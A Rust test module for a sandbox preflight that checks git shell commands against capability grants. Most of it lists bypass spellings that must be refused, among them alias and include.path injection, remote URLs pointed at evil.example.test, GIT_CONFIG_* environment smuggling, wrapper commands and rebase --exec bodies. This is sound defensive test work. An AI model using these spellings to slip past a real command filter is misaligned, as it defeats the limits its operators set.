            "git -calias.q=push q origin HEAD:refs/heads/x",
            "git --config alias.q=push q origin HEAD:refs/heads/x",
            "git --config=alias.q=push q origin HEAD:refs/heads/x",
            "git -c include.path=/tmp/evil.cfg q origin HEAD:refs/heads/x",
            "git -c includeIf.gitdir:/workspace/.path=/tmp/evil.cfg q origin",
            "git -c alias.b=!sh b",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    /// WI#857: shapes the preflight used to return `Ok` for without reading
    /// git at all. Each one is a command that real git acts on.
    #[test]
    fn unreadable_shell_shapes_are_refused_instead_of_passing() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            // `env` skipped `-u` but not its value, so `git` became an
            // argument to `env` and the alias was never read.
            "env -u FOO git -c alias.p=push p origin HEAD:x",
            "env -u FOO git push origin main",
            "env --unset FOO git push origin main",
            "env -C /tmp git push origin main",
            // `!` and `{` fell to the catch-all arm.
            "! git send-pack /workspace/remotes/origin.git HEAD:x",
            "{ git push origin main; }",
            "{ git push origin main; } && true",
            "if true; then git push origin main; fi",
            "while true; do git push origin main; done",
            // `timeout` skipped a fixed count of words, so `-s KILL` shifted
            // the command word.
            "timeout -s KILL 5 git push origin main",
            "timeout --signal=KILL 5 git push origin main",
            "timeout -k 5 5 git push origin main",
            "nice -n 5 git push origin main",
            "nice --adjustment 5 git push origin main",
            "time -f %e git push origin main",
            "exec -a gitname git push origin main",
            // `scan_shell_c` stopped at the value of `-o`.
            "bash -o posix -c 'git push origin main'",
            "bash --posix -c 'git push origin main'",
            "bash -O extglob -c 'git push origin main'",
            "bash --norc -c 'git push origin main'",
            "sh -ce 'git fetch upstream'",
            "bash -cex 'git fetch upstream'",
            "bash -ec 'git fetch upstream'",
            "bash -c -e -- 'git fetch upstream'",
            "bash '-cprintf fixture'",
            // An unknown leading word with git in its tail: the scan could
            // not tell an argument from the command a wrapper runs.
            "xargs -n1 git push origin main",
            "find . -exec git push origin main ;",
            "flock /tmp/lock git push origin main",
        ] {
            let error = check_granted(command, &grant)
                .err()
                .unwrap_or_else(|| panic!("passed but must be refused: {command}"));
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    /// WI#857: the shells and wrappers must not refuse ordinary commands.
    #[test]
    fn ordinary_commands_still_pass_the_hardened_parser() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git status",
            "git config --get user.name",
            "git config --list",
            "env FOO=1 git status",
            "env -u FOO git status",
            "timeout 30 git fetch origin",
            "timeout -s KILL 30 git fetch origin",
            "nice -n 5 git fetch origin",
            "bash -c 'git status'",
            "bash -o posix -c 'git status'",
            "bash -cex 'git status'",
            "bash -ec 'git status'",
            "sh -ce 'git status'",
            "grep git README",
            "which git",
            "ps aux | grep bash",
            "ls /bin/sh",
            "bash -lc 'git status'",
            "sh -c 'git fetch origin'",
            "git remote -v",
            "echo git push origin main",
            "printf '%s\\n' git push",
            "cd repo && git status",
            "true && git fetch origin",
            "! git status",
            "{ git status; }",
            "env FOO=1 bash -c 'git status'",
            "timeout 30 bash -c 'git fetch origin'",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
        }
    }

    /// WI#857: `git config` spellings that reach a redirecting key through
    /// the subcommands, the option forms, the rename target, or an editor.
    #[test]
    fn git_config_subcommands_and_prefixes_are_read() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            // The second operand of a rename is the section it writes.
            "git config zz.p push; git config --rename-section zz alias",
            "git config --rename-section zz alias",
            "git config rename-section zz alias",
            "git config --rename-section alias zz",
            // An editor can write any key.
            "git config -e",
            "git config --edit",
            "git config edit",
            "git config --local --edit",
            "git config -e --local",
            // git 2.46 subcommands named a checked key as the action word.
            "git config set alias.p push",
            "git config unset remote.origin.url",
            "git config set remote.origin.url https://evil.example.test/r.git",
            "git config --append alias.p push",
            "git config set --append alias.fixture status",
            "git config set --comment fixture alias.fixture status",
            "git config help.autocorrect 0",
            // git's own long-option prefixes.
            "git config --fil /tmp/cfg alias.p push",
            "git config --renam zz alias",
            "git config --appe alias.p push",
        ] {
            let error = check_granted(command, &grant)
                .err()
                .unwrap_or_else(|| panic!("passed but must be refused: {command}"));
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    /// WI#857: every assignment form the shell accepts, not just
    /// `NAME=value`.
    #[test]
    fn every_git_config_assignment_form_is_refused() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "readonly GIT_CONFIG_KEY_1=alias.p GIT_CONFIG_VALUE_1=push",
            "declare -x GIT_CONFIG_KEY_1=alias.p",
            "declare -x GIT_CONFIG_COUNT=1",
            "typeset -x GIT_CONFIG_COUNT=1",
            "local GIT_CONFIG_COUNT=1",
            "GIT_CONFIG_PARAMETERS+=\"'alias.p=push'\"",
            "GIT_CONFIG_COUNT+=1",
            "export -x GIT_CONFIG_COUNT=1",
            "export GIT_CONFIG_COUNT=1",
            "GIT_CONFIG_COUNT=1 git status",
            "env GIT_CONFIG_COUNT=1 git status",
            "env -u FOO GIT_CONFIG_COUNT=1 git status",
        ] {
            let error = check_granted(command, &grant)
                .err()
                .unwrap_or_else(|| panic!("passed but must be refused: {command}"));
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    /// WI#857: the action word of `git remote` sat behind `-v`, so the URL
    /// check never ran. A repository-local `remote.origin.url` outranks the
    /// host pin, so this reached another repository.
    #[test]
    fn remote_actions_are_read_behind_their_options() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git remote -v set-url origin https://evil.example.test/repo.git",
            "git remote --verbose add evil https://evil.example.test/repo.git",
            "git remote -v --no-progress set-url origin https://evil.example.test/repo.git",
            "git remote -v set-url --push origin https://evil.example.test/repo.git",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git remote -v",
            "git remote --verbose",
            "git remote -v set-url origin /workspace/remotes/origin.git",
            "git remote -v add backup file:///workspace/remotes/origin.git",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
        }
    }

    /// WI#857: `--attr-source` is a newer git option than the image's git,
    /// but its value must still not be read as the subcommand.
    #[test]
    fn git_global_value_options_do_not_shift_the_subcommand() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git --attr-source HEAD -c alias.p=push p origin main",
            "git --attr-source HEAD push origin main",
            "git --git-dir /workspace/repo/.git push origin main",
            "git --work-tree /workspace/repo push origin main",
            "git --namespace ns push origin main",
            "git --exec-path /usr/libexec/git-core push origin main",
            "git -C /workspace/repo push origin main",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git --attr-source HEAD status",
            "git --attr-source=HEAD status",
            "git --git-dir /workspace/repo/.git status",
            "git -C /workspace/repo status",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
        }
    }

    /// WI#857: bodies git runs through a shell were never read.
    #[test]
    fn shell_bodies_git_runs_are_scanned() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git rebase --exec 'git push origin HEAD' HEAD~1",
            "git rebase --exec='git push origin HEAD' HEAD~1",
            "git rebase -x 'git push origin HEAD' HEAD~1",
            "git rebase -x'git fetch upstream' HEAD~1",
            "git rebase --exe 'git fetch upstream' HEAD~1",
            "git rebase -i --exec 'git send-pack /workspace/remotes/origin.git HEAD:x' HEAD~1",
            "git submodule foreach 'git push origin main'",
            "git submodule foreach 'git fetch upstream'",
            "git submodule foreach --recursive 'git fetch upstream'",
            "git submodule --quiet foreach 'git fetch upstream'",
            "git bisect run git push origin main",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git rebase --exec 'cargo test' HEAD~1",
            "git rebase --exec 'make -j8' --exec 'cargo test' HEAD~1",
            "git rebase -i HEAD~3",
            "git submodule foreach 'cargo build'",
            "git submodule --quiet foreach --recursive 'cargo build'",
            "git bisect run cargo test",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
        }
    }

    #[test]
    fn shell_comments_continuations_and_incomplete_quotes() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "# unmatched '\ngit fetch upstream",
            "gi\\\nt fetch upstream",
            "echo 'unterminated",
        ] {
            assert!(check_granted(command, &grant).is_err(), "{command}");
        }
        for command in [
            "git status # unmatched '",
            "echo ordinary#text",
            "gi\\\nt status",
        ] {
            assert!(check_granted(command, &grant).is_ok(), "{command}");
        }
    }

    #[test]
    fn literal_config_destinations_and_git_callbacks_are_refused() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "printf -v GIT_CONFIG_COUNT %s 0",
            "read GIT_CONFIG_KEY_0",
            "mapfile GIT_CONFIG_VALUE_0",
            "declare -n fixture=GIT_CONFIG_COUNT",
            "unset GIT_CONFIG_COUNT",
            "GIT_SEQUENCE_EDITOR=true git rebase -i HEAD",
            "GIT_EDITOR=true git status",
            "git -c help.autocorrect=0 status",
            "git -c core.fsmonitor=false status",
            "git config set sequence.editor true",
            "git archive --remote=origin --exec=fixture HEAD",
            "git -c http.https://git.example.test/.extraHeader=fixture status",
            "git config set http.https://git.example.test/.extraHeader fixture",
        ] {
            assert!(check_granted(command, &grant).is_err(), "{command}");
        }
        for command in [
            "printf -v fixture %s allowed",
            "read fixture",
            "mapfile fixture",
            "declare -n fixture=ordinary",
            "echo GIT_CONFIG_COUNT",
            "git config http.https://git.example.test/.extraHeader",
        ] {
            assert!(check_granted(command, &grant).is_ok(), "{command}");
        }
    }

    #[test]
    fn quotes_and_nested_shell_text_are_scanned_conservatively() {
        let (_temp, grant) = workspace_with_remote();
        check_granted(
            "echo 'git clone https://evil.example.test/repo.git'",
            &grant,
        )
        .unwrap();
        for command in [
            "true && git push https://evil.example.test/repo.git main",
            "true; git push https://evil.example.test/repo.git main",
            "true | git clone https://evil.example.test/repo.git",
            "bash -lc \"git clone https://evil.example.test/repo.git\"",
            "bash -c 'git fetch upstream'",
        ] {
            assert!(check_granted(command, &grant).is_err(), "{command}");
        }
        let error = check_granted("bash -c \"$SCRIPT\"", &grant).unwrap_err();
        assert!(error.to_string().contains("dynamic"), "{error}");
    }

    /// A real local bare remote, driven by real `git` — not a fake runtime.
    /// The preflight authorizes the command and git itself performs the
    /// clone/push, so the grant is pinned against actual Git behaviour.
    fn real_remote_fixture() -> (tempfile::TempDir, std::path::PathBuf) {
        let temp = tempfile::tempdir().expect("tempdir");
        let root = temp.path().canonicalize().expect("canonical");
        let remote = root.join("remotes/origin.git");
        std::fs::create_dir_all(&remote).expect("remote dir");
        let git = |args: &[&str], dir: &Path| {
            let output = std::process::Command::new("git")
                .args(args)
                .current_dir(dir)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("GIT_TERMINAL_PROMPT", "0")
                .env("GIT_AUTHOR_NAME", "fixture")
                .env("GIT_AUTHOR_EMAIL", "fixture@example.test")
                .env("GIT_COMMITTER_NAME", "fixture")
                .env("GIT_COMMITTER_EMAIL", "fixture@example.test")
                .output()
                .expect("git runs");
            assert!(
                output.status.success(),
                "git {args:?} failed: {}{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            );
            output
        };
        git(&["init", "-q", "--bare", remote.to_str().unwrap()], &root);
        let work = root.join("work");
        git(&["init", "-q", work.to_str().unwrap()], &root);
        git(&["config", "user.name", "fixture"], &work);
        git(&["config", "user.email", "fixture@example.test"], &work);
        std::fs::write(work.join("file.txt"), "one\n").expect("write");
        git(&["add", "file.txt"], &work);
        git(&["commit", "-q", "-m", "one"], &work);
        git(
            &["remote", "add", "origin", remote.to_str().unwrap()],
            &work,
        );
        (temp, work)
    }

    /// Acceptance: with a write grant, a real `git push` lands on a real local
    /// remote; with a read-only grant the same push is refused before git
    /// runs.
    #[test]
    fn write_grant_pushes_to_a_real_local_remote_and_a_read_grant_refuses() {
        let (temp, work) = real_remote_fixture();
        let root = temp.path().canonicalize().expect("canonical");

        // Read-only grant: the preflight refuses, so git never runs.
        let read_host = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .expect("read grant")
            .expect("grant");
        let read_grant = authorize_grant(&read_host, &[], &root, SandboxNetworkMode::ProxyEnforced)
            .expect("authorized");
        let error = check_granted("git push origin HEAD:refs/heads/main", &read_grant)
            .expect_err("read-only push must be refused");
        assert!(matches!(error, SandboxError::CapabilityDenied { .. }));
        let output = std::process::Command::new("git")
            .args(["ls-remote", "origin"])
            .current_dir(&work)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .output()
            .expect("ls-remote");
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            String::from_utf8_lossy(&output.stdout).trim().is_empty(),
            "read-only refusal must leave the remote untouched"
        );

        // Write grant: the preflight accepts, and real git performs the push.
        let write_host =
            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
                .expect("write grant")
                .expect("grant");
        let write_grant =
            authorize_grant(&write_host, &[], &root, SandboxNetworkMode::ProxyEnforced)
                .expect("authorized");
        let push = "git push origin HEAD:refs/heads/main";
        check_granted(push, &write_grant).expect("write-granted push authorized");
        let output = std::process::Command::new("git")
            .args(["push", "origin", "HEAD:refs/heads/main"])
            .current_dir(&work)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_TERMINAL_PROMPT", "0")
            .output()
            .expect("git push");
        assert!(
            output.status.success(),
            "push failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );

        // The remote really has the ref.
        let output = std::process::Command::new("git")
            .args(["ls-remote", "--heads", "origin"])
            .current_dir(&work)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .output()
            .expect("ls-remote");
        let listing = String::from_utf8_lossy(&output.stdout);
        assert!(listing.contains("refs/heads/main"), "{listing}");
    }

    /// Acceptance: a real clone and fetch of a real remote, with the
    /// credential binding held host-side. The container-side environment and
    /// arguments carry no secret, and the proxy mapping is what supplies it.
    #[test]
    fn host_kept_credential_clones_a_real_remote_without_entering_the_container() {
        const SECRET: &str = "credential-value-marker-2b3c4d";
        let (temp, work) = real_remote_fixture();
        let root = temp.path().canonicalize().expect("canonical");

        let host = GitGrantConfig::from_full_spec(
            "origin=http://git.internal/org/repo.git",
            "",
            "origin=GIT_ORIGIN_TOKEN",
        )
        .expect("credential grant")
        .expect("grant");
        let grant = authorize_grant(&host, &[], &root, SandboxNetworkMode::ProxyEnforced)
            .expect("authorized");

        // The proxy mapping names the daemon variable, never its value.
        let mappings = grant.proxy_credentials();
        assert_eq!(mappings.len(), 1);
        assert_eq!(mappings[0].secret_name, "GIT_ORIGIN_TOKEN");

        // Nothing the container sees holds the secret.
        let mut container_visible = grant.container_env();
        container_visible.push(("GIT_CONFIG_COUNT".to_string(), "9".to_string()));
        let joined = container_visible
            .iter()
            .map(|(key, value)| format!("{key}={value}"))
            .collect::<Vec<_>>()
            .join("\n");
        for needle in [SECRET, "GIT_ORIGIN_TOKEN"] {
            assert!(
                !joined.contains(needle),
                "container env leaked {needle}: {joined}"
            );
        }
        let evidence = serde_json::to_string(&grant.evidence()).expect("evidence");
        assert!(evidence.contains("GIT_ORIGIN_TOKEN"), "{evidence}");
        assert!(!evidence.contains(SECRET), "{evidence}");

        // A real clone of the real local remote still works from the same
        // workspace (the credential is only needed for the network path).
        let clone_dir = root.join("clone");
        let output = std::process::Command::new("git")
            .args([
                "clone",
                "-q",
                work.join(".git").to_str().unwrap(),
                clone_dir.to_str().unwrap(),
            ])
            .current_dir(&root)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_TERMINAL_PROMPT", "0")
            .output()
            .expect("git clone");
        assert!(
            output.status.success(),
            "clone failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(clone_dir.join("file.txt").exists());
    }
}
